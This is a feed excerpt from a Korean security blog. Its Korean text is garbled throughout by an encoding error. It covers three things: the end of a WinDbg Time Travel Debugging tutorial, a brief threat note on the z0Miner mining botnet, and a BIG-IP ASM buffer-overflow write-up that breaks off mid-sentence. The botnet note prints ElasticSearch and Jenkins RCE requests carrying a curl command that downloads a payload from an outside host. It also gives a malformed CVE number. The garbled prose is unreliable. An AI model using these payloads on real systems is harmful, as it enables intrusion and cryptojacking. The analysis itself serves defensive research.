ê¸€ë¹¨ì´ ë”¸ë¦¬ê³ â€¦</p><p><img src="/2021/03/14/fabu1ous/ttd-3/both.png"></p><p>ê·¸ë˜ì„œ Part 2 ë§ˆì§€ë§‰ì— ì˜ˆê³ í–ˆë˜ ë‘ ê°€ì§€ ê¸€ ì£¼ì œë¥¼ Part 3ì— ëª°ì•„ ì“°ê¸°ë¡œ ê²°ì •í–ˆìŠµë‹ˆë‹¤.</p><h2 id="ì‹œê°„ì„-ì—¬í–‰í•˜ëŠ”-í•´ì»¤ë¥¼-ìœ„í•œ-ì•ˆë‚´ì„œ-ì´ì „-ê¸€"><a href="#ì‹œê°„ì„-ì—¬í–‰í•˜ëŠ”-í•´ì»¤ë¥¼-ìœ„í•œ-ì•ˆë‚´ì„œ-ì´ì „-ê¸€" class="headerlink" title="ì‹œê°„ì„ ì—¬í–‰í•˜ëŠ” í•´ì»¤ë¥¼ ìœ„í•œ ì•ˆë‚´ì„œ ì´ì „ ê¸€"></a>ì‹œê°„ì„ ì—¬í–‰í•˜ëŠ” í•´ì»¤ë¥¼ ìœ„í•œ ì•ˆë‚´ì„œ ì´ì „ ê¸€</h2><ol><li><a href="https://hackyboiz.github.io/2021/01/24/fabu1ous/ttd-1/">Part1</a></li><li><a href="https://hackyboiz.github.io/2021/02/21/fabu1ous/ttd-2/">Part2</a></li></ol><h1 id="Time-Travel-Debugging-objects"><a href="#Time-Travel-Debugging-objects" class="headerlink" title="Time Travel Debugging objects"></a>Time Travel Debugging objects</h1><p>ì´ë²ˆ Part 3ì—ì„  TTD data model objectì™€ Trace Fileë¡œë¶€í„° TTD data model objectë¥¼ Query í•˜ëŠ” ë°©ë²•ì— ëŒ€í•´ ì•Œì•„ë³¼ ê²ë‹ˆë‹¤. TTD Trace File ì‚¬ìš© ì‹œ ìë™ìœ¼ë¡œ Process Objectì™€ Session Objectì— ë°ì´í„°ê°€ ë¡œë“œë˜ë©° <code>dx</code> ëª…ë ¹ì–´ë¥¼ í†µí•´ ê·¸ ë°ì´í„°ë“¤ì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><h1 id="dx-ëª…ë ¹ì–´"><a href="#dx-ëª…ë ¹ì–´" class="headerlink" title="dx ëª…ë ¹ì–´"></a>dx ëª…ë ¹ì–´</h1><pre><code class="hljs c"><span class="hljs-number">0</span>:<span class="hljs-number">000</span>&gt; dx Debugger</code></pre><p><img src="/2021/03/14/fabu1ous/ttd-3/3.png"></p><p><code>dx</code>ëŠ” Debugger Object Model Expressionì„ ì¶œë ¥í•´ì£¼ëŠ” ëª…ë ¹ì–´ì…ë‹ˆë‹¤. ì œê°€ ì£¼ë¡œ ì‚¬ìš©í•˜ëŠ” ê¸°ëŠ¥ ìœ„ì£¼ë¡œ(ë”± ì´ ê¸€ì„ ì½ëŠ”ë° í•„ìš”í•œ ê²ƒë“¤ë§Œ) ì„¤ëª…í•˜ê² ìŠµë‹ˆë‹¤. ë”°ë¼ì„œ <code>dx</code> ëª…ë ¹ì–´ì— ëŒ€í•´ ì¶”ê°€ë¡œ ë” ì•Œì•„ë³´ê³  ì‹¶ìœ¼ì‹  ë¶„ë“¤ì€ <a href="%5B%5D()">ms docs dx</a>ë¥¼ ì½ì–´ë³´ì‹œê¸¸ ë°”ëë‹ˆë‹¤.</p><p>ìš°ì„  <code>dx</code> ëª…ë ¹ì–´ì˜ íŒŒë¼ë¯¸í„°ë¥¼ ì•Œì•„ë´…ì‹œë‹¤. ì´ë²ˆ Part 3ì—ì„œ ì•ìœ¼ë¡œ ì‚¬ìš©í•  íŒŒë¼ë¯¸í„°ë“¤ì€ <code>-g</code>ì™€ <code>-r#</code>ì´ ìˆìŠµë‹ˆë‹¤.</p><ul><li><p>-g</p><p>ë°ì´í„°ë¥¼ ê·¸ë¦¬ë“œë¡œ ì¶œë ¥í•´ì£¼ëŠ” íŒŒë¼ë¯¸í„°ì…ë‹ˆë‹¤. ì£¼ë¡œ Heap Objectë‚˜ Module Object ë“±ì„ í™•ì¸í•  ë•Œ ì‚¬ìš©í•©ë‹ˆë‹¤.</p></li><li><p>-r#</p><p>ìµœëŒ€ <code>#</code> ë ˆë²¨ê¹Œì§€ í•˜ìœ„ í•„ë“œë¥¼ ì¶œë ¥í•´ì£¼ëŠ” íŒŒë¼ë¯¸í„°ì…ë‹ˆë‹¤. ìƒëµí•˜ë©´ <code>-r1</code>ì´ ê¸°ë³¸ê°’ìœ¼ë¡œ ì ìš©ë©ë‹ˆë‹¤.</p></li></ul><h2 id="ì‚¬ìš©-ì˜ˆì‹œ"><a href="#ì‚¬ìš©-ì˜ˆì‹œ" class="headerlink" title="ì‚¬ìš© ì˜ˆì‹œ"></a>ì‚¬ìš© ì˜ˆì‹œ</h2><ul><li>call stack ì¶œë ¥</li></ul><pre><code class="hljs c"><span class="hljs-number">0</span>:<span class="hljs-number">000</span>&gt; dx -r1 Debugger.Sessions.First().Processes.First().Threads.First().Stack.Frames</code></pre><p><img src="/2021/03/14/fabu1ous/ttd-3/4.png"></p><p>dxë¥¼ ì‚¬ìš©í•´ ë””ë²„ê¹… ì„¸ì…˜ì˜ ì²« ë²ˆì§¸ í”„ë¡œì„¸ìŠ¤ì˜ ì²« ë²ˆì§¸ ì“°ë ˆë“œì˜ call stackì„ <code>-r1</code>ì˜ ì¬ê·€ ë ˆë²¨ë¡œ ì¶œë ¥í•œ ëª¨ìŠµì…ë‹ˆë‹¤.</p><ul><li>ë¡œë“œëœ ëª¨ë“ˆ ë¦¬ìŠ¤íŠ¸ ì¶œë ¥</li></ul><pre><code class="hljs c"><span class="hljs-number">0</span>:<span class="hljs-number">000</span> &gt; dx -g @$curprocess.Modules</code></pre><p><img src="/2021/03/14/fabu1ous/ttd-3/5.png"></p><p>Trace ì „ì²´ì—ì„œ ë¡œë“œí•˜ëŠ” Moduleë“¤ì„ grid í˜•ì‹ìœ¼ë¡œ ì¶œë ¥í•œ ëª¨ìŠµì…ë‹ˆë‹¤.</p><h1 id="Process-Object"><a href="#Process-Object" class="headerlink" title="Process Object"></a>Process Object</h1><p><img src="/2021/03/14/fabu1ous/ttd-3/6.png"></p><p>dx ëª…ë ¹ì–´ì— ëŒ€í•´ ì•Œì•„ë´¤ìœ¼ë‹ˆ ì´ì œ ë³¸ê²© ì ìœ¼ë¡œ TTD data model objectì— ëŒ€í•´ ì•Œì•„ë´…ì‹œë‹¤. ê¸€ ì´ˆë°˜ ë¶€ì— ì–¸ê¸‰í–ˆë“¯ì´ TTDë¥¼ ì‚¬ìš©í•˜ë©´ ìë™ìœ¼ë¡œ Process objectì™€ Session objectì— ë°ì´í„° ëª¨ë¸ë“¤ì´ ì €ì¥ëœë‹¤ê³  í–ˆì—ˆì£ ? ê·¸ì¤‘ Process Objectì…ë‹ˆë‹¤.  <code>@$curprocess.TTD</code> namespaceë¥¼ ì´ìš©í•´ ì ‘ê·¼í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><ul><li><p>Lifetime</p><p><img src="/2021/03/14/fabu1ous/ttd-3/7.png"></p><p>TTD range objectë¥¼ ì‚¬ìš©í•´ ì „ì²´ Trace Fileì˜ ë²”ìœ„ë¥¼ ë³´ì—¬ì¤ë‹ˆë‹¤. MinPositionì€ Trace Fileì˜ ì‹œì‘ ì‹œì ì— í•´ë‹¹í•˜ëŠ” TTD Positionì„, MaxPositionì€ Trace Fileì˜ ì¢…ë£Œ ì‹œì ì— í•´ë‹¹í•˜ëŠ” TTD Positionì„ ëœ»í•©ë‹ˆë‹¤.</p></li><li><p>Threads</p><p><img src="/2021/03/14/fabu1ous/ttd-3/8.png"></p><p>TTD thread objectë¥¼ ì‚¬ìš©í•´ ì „ì²´ Trace Fileì˜ Lifetimeì— ì¡´ì¬í•˜ëŠ” ëª¨ë“  ì“°ë ˆë“œë“¤ì— ëŒ€í•œ ì •ë³´ê°€ ì €ì¥ë˜ì–´ ìˆìŠµë‹ˆë‹¤.</p></li><li><p>Events</p><p><img src="/2021/03/14/fabu1ous/ttd-3/9.png"></p><p>TTD event objectë“¤ì´ ì €ì¥ë˜ì–´ ìˆìŠµë‹ˆë‹¤. ì¶œë ¥ ì‹œ Trace File ì „ì²´ì—ì„œ ë°œìƒí•œ ì—¬ëŸ¬ ì´ë²¤íŠ¸ë“¤ì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì˜ˆë¥¼ ë“¤ë©´ Moduleì˜ ë¡œë“œ ì‹œì ì´ë¼ë˜ê°€ Exception ë°œìƒ ì‹œì ì´ë¼ë˜ê°€. Part 2ì—ì„  ì´ Event objectë¥¼ ì‚¬ìš©í•´ Exception ìœ„ì¹˜ë¥¼ í™•ì¸í•˜ê³ , ë””ë²„ê¹…ì˜ ì‹œì‘ ìœ„ì¹˜ë¥¼ ì •í•˜ê¸° ìœ„í•´ ì‚¬ìš©í–ˆì—ˆìŠµë‹ˆë‹¤.</p></li></ul><h1 id="Session-Object"><a href="#Session-Object" class="headerlink" title="Session Object"></a>Session Object</h1><p><img src="/2021/03/14/fabu1ous/ttd-3/10.png"></p><p>ì´ë²ˆì—” Session Objectì…ë‹ˆë‹¤. <code>@$cursession.TTD</code> namespaceë¥¼ í†µí•´ ì ‘ê·¼í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><ul><li><p>Data.Heap()</p><p><img src="/2021/03/14/fabu1ous/ttd-3/11.png"></p><p>Trace File ì „ì²´ì—ì„œ í• ë‹¹ëœ Heap objectë“¤ì´ ì €ì¥ë˜ì–´ ìˆìŠµë‹ˆë‹¤. <code>Data.Heap()</code> ë©”ì†Œë“œì™€ grid íŒŒë¼ë¯¸í„°ë¥¼ ì‚¬ìš©í•´ ì¶œë ¥í•´ì¤„ ì£¼ì†Œ, ì‚¬ì´ì¦ˆ, í• ë‹¹ ì‹œì , í•´ì œ ì‹œì ì„ í•œëˆˆì— ë³¼ ìˆ˜ ìˆì–´ ë˜ê²Œ í¸ë¦¬í•©ë‹ˆë‹¤. ìµœê·¼ì— ë²„ê·¸ ë°”ìš´í‹°ë¥¼ í•˜ë©´ì„œ í™ ì˜¤ë²„í”Œë¡œìš°ë¡œ ì˜ì‹¬ë˜ëŠ” ë²„ê·¸ë¥¼ ë¶„ì„ ì¤‘ì¸ë° ì´ <code>Data.Heap()</code> objectë¥¼ ì •ë§ ìœ ìš©í•˜ê²Œ ì‚¬ìš©í•˜ê³  ìˆìŠµë‹ˆë‹¤.</p></li><li><p>Calls()</p><p><img src="/2021/03/14/fabu1ous/ttd-3/12.png"></p><p>íŠ¹ì • í•¨ìˆ˜ì˜ í˜¸ì¶œì— ëŒ€í•œ ì—¬ëŸ¬ ì •ë³´ë¥¼ ë‹´ê³  ìˆëŠ” calls objectì…ë‹ˆë‹¤. <code>Calls()</code> ë©”ì†Œë“œë¥¼ í†µí•´ í˜¸ì¶œ íšŸìˆ˜, í˜¸ì¶œ ì‹œì , ë¦¬í„´ ì‹œì , ë¦¬í„´ ê°’ ë“±ì˜ ì •ë³´ë¥¼ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤. breakpointì˜ ìƒìœ„ í˜¸í™˜ìœ¼ë¡œ ì‚¬ìš©ì´ ê°€ëŠ¥í•©ë‹ˆë‹¤. ì–´ë–¤ í•¨ìˆ˜ì—ì„œ ë²„ê·¸ê°€ ë°œìƒí•˜ëŠ”ì§€ ì•Œê³  ìˆë‹¤ë©´ Calls queryë¥¼ TimeStartê°’ìœ¼ë¡œ ì •ë ¬í•œ í›„ ë§¨ ë§ˆì§€ë§‰ ë°ì´í„° í˜¹ì€ crash ë°œìƒ ì‹œì ê³¼ ê°€ì¥ ê°€ê¹Œìš´ ë°ì´í„°ë¥¼ ì„ íƒí•´ ë²„ê·¸ê°€ ë°œìƒí•˜ëŠ” ì •í™•í•œ ì‹œì ìœ¼ë¡œ ì´ë™ì´ ê°€ëŠ¥í•©ë‹ˆë‹¤. ì•„ì‰½ê²Œë„ Calls() ë©”ì†Œë“œë¥¼ ì‚¬ìš©í•˜ë ¤ë©´ í•´ë‹¹ í•¨ìˆ˜ì˜ ì‹¬ë³¼ì´ ì‚´ì•„ ìˆì–´ì•¼ í•´ì„œ ë²„ê·¸ ë°”ìš´í‹°ë¥¼ í•  ë•Œ ì‚¬ìš©í•˜ì§€ ëª»í•˜ëŠ” ê²½ìš°ë„ ìˆìŠµë‹ˆë‹¤.</p></li><li><p>Memory()</p><p><img src="/2021/03/14/fabu1ous/ttd-3/13.png"></p><p>Memory objectë¥¼ ì‚¬ìš©í•´ íŠ¹ì • ë©”ëª¨ë¦¬ ì£¼ì†Œì— ë°œìƒí•œ ëª¨ë“  ì ‘ê·¼ì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. íŠ¹ì • ë©”ëª¨ë¦¬ ì£¼ì†Œì— ì ‘ê·¼í•œ ì‹œì , ì ‘ê·¼ íƒ€ì…, ë‹¹ì‹œ í”„ë¡œê·¸ë¨ ì¹´ìš´í„°ì˜ ìƒí™© ë“±ì„ í•¨ê»˜ ì €ì¥í•˜ê³  ìˆìŠµë‹ˆë‹¤. ba ëª…ë ¹ì–´ì˜ ìƒìœ„ í˜¸í™˜ìœ¼ë¡œ ì‚¬ìš©í•  ìˆ˜ ìˆì–´ì„œ Part 2ì—ì„œ EBPê°€ ë®ì–´ ì“°ì´ëŠ” ì‹œì ì„ ì°¾ê¸° ìœ„í•´ ba ëª…ë ¹ì–´ ëŒ€ì‹  ì´ Memory objectë¥¼ ì‚¬ìš©í• ê¹Œ ê³ ë¯¼í–ˆì—ˆìŠµë‹ˆë‹¤. baì˜ ê²½ìš°ì—” ë©”ëª¨ë¦¬ì˜ rangeë¥¼ ìµœëŒ€ 8 bytesê¹Œì§€ ì§€ì •í•  ìˆ˜ ìˆì§€ë§Œ TTD Memory object queryëŠ” ì œí•œì´ ì—†ìŠµë‹ˆë‹¤.</p></li></ul><h1 id="Query"><a href="#Query" class="headerlink" title="Query"></a>Query</h1><p>TTD data objectë“¤ì˜ ì¢…ë¥˜ì™€ ê·¸ì— ë§ëŠ” ë©”ì†Œë“œë“¤ì˜ ì¢…ë¥˜ë¥¼ ì•Œì•„ë´¤ìŠµë‹ˆë‹¤. ì´ì œ ê·¸ ë©”ì†Œë“œë“¤ì„ í†µí•´ ë¦¬í„´ ë°›ì€ ë°ì´í„°ë“¤ì„ ì •ë ¬ ë° ê°€ê³µí•˜ëŠ” ë°©ë²•ì„ ì•Œì•„ë´…ì‹œë‹¤.</p><h2 id="Sorting-Queries"><a href="#Sorting-Queries" class="headerlink" title="Sorting Queries"></a>Sorting Queries</h2><p>OrderBy() í˜¹ì€ OrderByDescending()ì„ ì‚¬ìš©í•´ íŠ¹ì • columnì„ ê¸°ì¤€ìœ¼ë¡œ ë°ì´í„°ë¥¼ ì •ë ¬í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ìœ„ì—ì„œ Calls() ë©”ì†Œë“œ ì´ì•¼ê¸°ë¥¼ í•˜ë©´ì„œ ì„¤ëª…í–ˆë˜ ë‚´ìš©ì¸ë° crash ì‹œì , í˜¹ì€ Trace Fileì˜ ì¢…ë£Œ ì‹œì ê³¼ ê°€ì¥ ê°€ê°€ìš´ ë°ì´í„°ë¥¼ ì„ íƒí•˜ê¸° ìœ„í•´ TimeStartì™€ OrderByDescending()ì„ ì£¼ë¡œ ì‚¬ìš©í•©ë‹ˆë‹¤.</p><ul><li>OrderBy()</li></ul><pre><code class="hljs c">dx @$cursession.TTD.Calls(<span class="hljs-string">&quot;kernelbase!GetLastError&quot;</span>).OrderBy(c =&gt; c.TimeStart)</code></pre><p>TimeStart columnìœ¼ë¡œ ì˜¤ë¦„ ì°¨ìˆœ ì •ë ¬ì„ í•˜ëŠ” ì˜ˆì œ queryì…ë‹ˆë‹¤. (ì‚¬ì‹¤ TimeStartë¡œ ì˜¤ë¦„ ì°¨ìˆœ ì •ë ¬í•˜ëŠ” ê±´ ì˜ë¯¸ê°€ ì—†ìŠµë‹ˆë‹¤. ì´ë¯¸ ì •ë ¬ ë˜ì–´ ìˆê±°ë“ ìš”.)</p><ul><li>OrderByDescending()</li></ul><pre><code class="hljs c">dx -r2 @$cursession.TTD.Calls(<span class="hljs-string">&quot;kernelbase!GetLastError&quot;</span>).OrderByDescending(c =&gt; c.TimeStart)</code></pre><p>TimeStart columnìœ¼ë¡œ ë‚´ë¦¼ ì°¨ìˆœ ì •ë ¬ì„ í•˜ëŠ” ì˜ˆì œ queryì…ë‹ˆë‹¤.</p><h2 id="Specifying-elements-in-query"><a href="#Specifying-elements-in-query" class="headerlink" title="Specifying elements in query"></a>Specifying elements in query</h2><p>queryì— append ëœ elementë¥¼ íŠ¹ì •ì§€ì–´ì„œ ì¶œë ¥ì‹œí‚¬ ìˆ˜ ìˆìŠµë‹ˆë‹¤. First() ë©”ì†Œë“œë¥¼ ì‚¬ìš©í•´ ì²« ë²ˆì§¸ elementë¥¼ íŠ¹ì • ì§–ê±°ë‚˜ ëŒ€ê´„í˜¸ì™€ index numberë¥¼ ì‚¬ìš©í•´ ì›í•˜ëŠ” elementë¥¼ íŠ¹ì •í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><pre><code class="hljs c">dx @$cursession.TTD.Calls(<span class="hljs-string">&quot;kernelbase!GetLastError&quot;</span>).First()dx @$cursession.TTD.Calls(<span class="hljs-string">&quot;kernelbase!GetLastError&quot;</span>)[<span class="hljs-number">0x0</span>]</code></pre><h2 id="Filtering-in-a-query"><a href="#Filtering-in-a-query" class="headerlink" title="Filtering in a query"></a>Filtering in a query</h2><p>SQLê³¼ ë¹„ìŠ·í•˜ê²Œ Where() í˜¹ì€ Select()ë¥¼ ì‚¬ìš©í•´ queryë¥¼ í•„í„°ë§í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì•„ë˜ ì˜ˆì œëŠ” <code>kernelbase!GetLastError</code>ì˜ í˜¸ì¶œì¤‘ ë¦¬í„´ ê°’ì´ 0ì´ ì•„ë‹Œ ë°ì´í„°ì˜ TimeStartê°’ê³¼ ReturnValueê°’ì„ ì¶œë ¥í•˜ë„ë¡ í•„í„°ë§ëœ queryì…ë‹ˆë‹¤. Select() ë©”ì†Œë“œëŠ” ê° columnì˜ display nameì„ ì§€ì •í•´ ì¤„ ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤. ë©”ëª¨ë¦¬ ì»¤ëŸ½ì…˜ ì·¨ì•½ì ì„ ì°¾ì„ ë•Œ string ê´€ë ¨ í•¨ìˆ˜ì˜ size íŒŒë¼ë¯¸í„°ì™€ ë¦¬í„´ ê°’ì´ ë‹¤ë¥¸ í˜¸ì¶œë§Œ ê³¨ë¼ ë³¼ ë•Œ ì‚¬ìš©í•˜ê¸° ìœ ìš©í•©ë‹ˆë‹¤.</p><pre><code class="hljs c">dx -r2 @$cursession.TTD.Calls(<span class="hljs-string">&quot;kernelbase!GetLastError&quot;</span>).Where(c =&gt; c.ReturnValue != <span class="hljs-number">0</span>).Select(c =&gt; <span class="hljs-keyword">new</span> &#123; Time = c.TimeStart, Error = c.ReturnValue &#125;)</code></pre><h2 id="Assigning-query-to-a-variable"><a href="#Assigning-query-to-a-variable" class="headerlink" title="Assigning query to a variable"></a>Assigning query to a variable</h2><p>íŠ¹ì • queryë¥¼ ë³€ìˆ˜ì— ì €ì¥í•œ í›„ ì‚¬ìš©í•  ìˆ˜ ìˆì–´ì„œ ê¸´ queryë¥¼ ë§¤ë²ˆ ì…ë ¥í•  í•„ìš”ê°€ ì—†ìŠµë‹ˆë‹¤.</p><pre><code class="hljs c">dx -r2 @$myResults = @$cursession.TTD.Calls(<span class="hljs-string">&quot;kernelbase!GetLastError&quot;</span>).Where(c =&gt; c.ReturnValue != <span class="hljs-number">0</span>).Select(c =&gt; <span class="hljs-keyword">new</span> &#123; Time = c.TimeStart, Error = c.ReturnValue &#125;)</code></pre><h1 id="ë§ˆì¹˜ë©°"><a href="#ë§ˆì¹˜ë©°" class="headerlink" title="ë§ˆì¹˜ë©°"></a>ë§ˆì¹˜ë©°</h1><p><img src="/2021/03/14/fabu1ous/ttd-3/14.png"></p><p>ì´ê±¸ë¡œ â€œì‹œê°„ì„ ì—¬í–‰í•˜ëŠ” í•´ì»¤ë¥¼ ìœ„í•œ ì•ˆë‚´ì„œâ€ ì‹œë¦¬ì¦ˆê°€ ëë‚¬ìŠµë‹ˆë‹¤. ì´ë²ˆì— TTDë¡œ ë²„ê·¸ ë°”ìš´í‹° í•˜ë©´ì„œ ëŠë‚€ ê±´ë° TTD ì—†ìœ¼ë©´ ë” ì´ìƒ ë¦¬ë²„ì‹±ì„ ëª»í•˜ëŠ” ëª¸ì´ ë¼ë²„ë ¸ìŠµë‹ˆë‹¤. ì‘ë…„ì—” TTD ì—†ì´ ë¦¬ë²„ì‹±ì„ ì–´ë–»ê²Œ í•œ ê±°ì§€? ì˜¤íˆë ¤ ê·¸ë•Œ ë” ë¦¬ë²„ì‹±ì„ ì˜í–ˆë˜ ê±° ê°™ê¸°ë„ í•©ë‹ˆë‹¤. ã…ã…;; ì•„ë¬´íŠ¼ ê·¸ë§Œí¼ TTDê°€ ì¢‹ë‹¤!ë¼ê³  ê²°ë¡  ì§“ë„ë¡ í•˜ê² ìŠµë‹ˆë‹¤. ì´ì   ì§„ì§œ ìµìŠ¤ í•˜ëŸ¬ ê°€ë³´ê² ìŠµë‹ˆë‹¤.</p>]]></content>
    
    
    <categories>
      
      <category>Research</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>windbg</tag>
      
      <tag>time travel debugging</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] z0Miner: Mining Botnet Spreading quickly</title>
    <link href="/2021/03/13/fabu1ous/2021-03-13/"/>
    <url>/2021/03/13/fabu1ous/2021-03-13/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a><strong>URL</strong></h2><p><a href="https://blog.netlab.360.com/threat-alert-z0miner-is-spreading-quickly-by-exploiting-elasticsearch-and-jenkins-vulnerabilities/">Threat Alert: z0Miner Is Spreading quickly by Exploiting ElasticSearch and Jenkins Vulnerabilities</a></p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>ìµœê·¼ ë¹„íŠ¸ì½”ì¸ì˜ ìƒìŠ¹ê³¼ í•¨ê»˜ ë‹¤ì–‘í•œ ì±„êµ´ ë´‡ë„· ê³µê²©ì´ ëŠ˜ì–´ë‚¬ìŠµë‹ˆë‹¤. ëŒ€ë¶€ë¶„ ê°ì—¼ ë°©ì‹ì„ ë°”ê¿¨ì„ ë¿ ì˜¤ë˜ëœ ë´‡ë„·ì´ë©° ê·¸ì¤‘ z0Minerë„ í¬í•¨ë˜ì–´ ìˆìŠµë‹ˆë‹¤. z0MinerëŠ” 2ê°€ì§€ Weblogic RCE ì·¨ì•½ì ì„ ì‚¬ìš©í•´ ì „íŒŒë©ë‹ˆë‹¤. z0MinerëŠ” ì•„ë˜  ë‘ ì·¨ì•½ì ì„ ì‚¬ìš©í•´ íƒ€ê²Ÿ ì‹œìŠ¤í…œì— <code>hxxp://27.1.1.34:8080/docs/conf.txt</code>ë¥¼ ì„¤ì¹˜í•˜ê³  ì‹¤í–‰í•©ë‹ˆë‹¤.</p><ol><li><p>ElasticSearch RCE (CVE-2021-2015-1427)</p><pre><code class="hljs"><span class="hljs-keyword">POST</span> <span class="hljs-string">/&#123;VULN_URI&#125;</span> HTTP/1.1<span class="hljs-attribute">Host</span>: &#123;target&#125;:&#123;port&#125;&#123;...exec(\&quot;curl -fsSL http://27.1.1.34:8080/docs/conf.txt -o /tmp/baby\&quot;)...&#125;</code></pre></li></ol><ol start="2"><li><p>Jenkins script console RCE</p><pre><code class="hljs"><span class="hljs-keyword">POST</span> <span class="hljs-string">/&#123;VULN_URI&#125;</span> HTTP/1.1<span class="hljs-attribute">Host</span>: &#123;target&#125;:&#123;port&#125;curl+-fsSL+http%3A%2F%2F27.1.1.34:8080%2Fdocs%2Fconf.txt+-o+%2Ftmp%2Fsolr%22.execute%28%29.text&amp;json=%7B%22script%22%3A+%22println+%5C%22curl+-fsSL+http%3A%2F%2F27.1.1.34:8080%2Fdocs%2Fconf.txt+-o+%2Ftmp%2Fsolr%5C%22.execute%28%29.text%22%2C+%22%22%3A+%22%22%7D&amp;Submit=Run</code></pre></li></ol><p>íƒ€ê²Ÿ ì‹œìŠ¤í…œì— ì„¤ì¹˜ëœ <code>hxxp://27.1.1.34:8080/docs/conf.txt</code>ëŠ” ë‹¤ìŒê³¼ ê°™ì€ ë™ì‘ì„ í•©ë‹ˆë‹¤.</p><ol><li>íƒ€ê²Ÿ ì‹œìŠ¤í…œì— ë‹¤ë¥¸ ì±„êµ´ ë´‡ë„·ì´ ì¡´ì¬í•˜ë©´ ê·¸ ë´‡ë„·ì„ ì¢…ë£Œ</li><li>ì¶”ê°€ ì•…ì„± ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì„¤ì¹˜</li><li>ì±„êµ´ í”„ë¡œê·¸ë¨ ì„¤ì¹˜ ë° ì‹¤í–‰</li></ol>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>botnet</tag>
      
      <tag>bitcoin</tag>
      
      <tag>monroe</tag>
      
      <tag>mining</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] CVE-2021-22992: BIG-IP ASMì˜ stack buffer overflow ì·¨ì•½ì </title>
    <link href="/2021/03/12/l0ch/2021-03-12/"/>
    <url>/2021/03/12/l0ch/2021-03-12/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=2132">F5 Big IP - ASM stack-based buffer overflow in is_hdr_criteria_matches</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>BIGâ€‘IP Application Security Manager</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Google project zeroê°€ F5ì‚¬ì˜ ì›¹ ì• í”Œë¦¬ì¼€ì´ì…˜ ë°©í™”ë²½(WAF) ì†”ë£¨ì…˜ì¸ BIG-IP ASMì—ì„œ ë°œê²¬í•œ stack ê¸°ë°˜ buffer overflow ì·¨ì•½ì ì˜ ì„¸ë¶€ ì •ë³´ë¥¼ ê³µê°œí•˜ì˜€ìŠµë‹ˆë‹¤.</p><p>BIG-IP ASMì´ ì›¹ ë°©í™”ë²½ì˜ ê¸°ëŠ¥ì„ ì œê³µí•˜ê¸° ìœ„í•´ì„œëŠ” response í—¤ë”ë¥¼ ë¶„ì„í•´ì•¼ í•©ë‹ˆë‹¤. ë°±ì—”ë“œì—ì„œ ë°˜í™˜ëœ ëª¨ë“  HTTP í—¤ë”ê°€ <code>is_hdr_criteria_matches</code> í•¨ìˆ˜ì— ì „ë‹¬ë˜ëŠ”ë°, í•´ë‹¹ í•¨ìˆ˜ì— ì·¨ì•½ì ì´ ì¡´ì¬í•©ë‹ˆë‹¤.</p><pre><code class="hljs c"><span class="hljs-number">01</span>  <span class="hljs-keyword">uint32_t</span> nlen;<span class="hljs-number">02</span>  <span class="hljs-keyword">uint32_t</span> vlen;<span class="hljs-number">03</span>  <span class="hljs-keyword">char</span> buf [<span class="hljs-number">8264</span>];<span class="hljs-number">04</span> <span class="hljs-number">05</span>  nlen = <span class="hljs-number">8192</span>;<span class="hljs-number">06</span>  <span class="hljs-keyword">if</span> (hdr-&gt;nlen &lt;= <span class="hljs-number">8192</span>)<span class="hljs-number">07</span>    nlen = hdr-&gt;nlen; <span class="hljs-number">08</span>  extract_header_item (.., .., .., nlen, buf); <span class="hljs-number">09</span>  vlen = hdr-&gt;vlen;<span class="hljs-number">10</span>  buf[nlen] = <span class="hljs-string">&#x27;:&#x27;</span>;<span class="hljs-number">11</span>  buf[nlen + <span class="hljs-number">1</span>] = <span class="hljs-string">&#x27; &#x27;</span>;<span class="hljs-number">12</span>  <span class="hljs-keyword">if</span> (<span class="hljs-number">8190</span>-nlen &lt;= vlen) <span class="hljs-number">13</span>   vlen = <span class="hljs-number">8190</span>-nlen;<span class="hljs-number">14</span>  extract_header_item (.., .., .., vlen, &amp;buf[nlen + <span class="hljs-number">2</span>]); <span class="hljs-number">15</span>  len = nlen + vlen + <span class="hljs-number">2</span>;<span class="hljs-number">16</span>  buf[len] = <span class="hljs-number">0</span>;</code></pre><p>HTTP í—¤ë” ì´ë¦„ì˜ ê¸¸ì´ë¥¼ ìµœëŒ€ 8192ê¹Œì§€ <code>nlen</code>ì— ì €ì¥í•©ë‹ˆë‹¤. ì´í›„ êµ¬ë¶„ì <code>:</code> ë° ê³µë°±ì„ ì¶”ê°€í•œ ë’¤ 12ë²ˆì§¸ ì¤„ <code>if (8190-nlen &lt;= vlen)</code> ì¡°ê±´ë¬¸ì—ì„œ í—¤ë” ê¸¸ì´ë¥¼ ì œí•œí•©ë‹ˆë‹¤. ê·¸ëŸ¬ë‚˜ <code>nlen</code>ì˜ ê¸¸ì´ê°€ 8190ë³´ë‹¤ í´ ê²½ìš° <code>8190-nlen</code>ì—ì„œ unsignedë¡œì˜ ì•”ì‹œì  í˜• ë³€í™˜ìœ¼ë¡œ ì¸í•´ underflow ë˜ì–´ UINT_MAXì— ê°€ê¹Œìš´ ê²°ê³¼ê°€ ë©ë‹ˆë‹¤. ê²°ê³¼ì ìœ¼ë¡œ 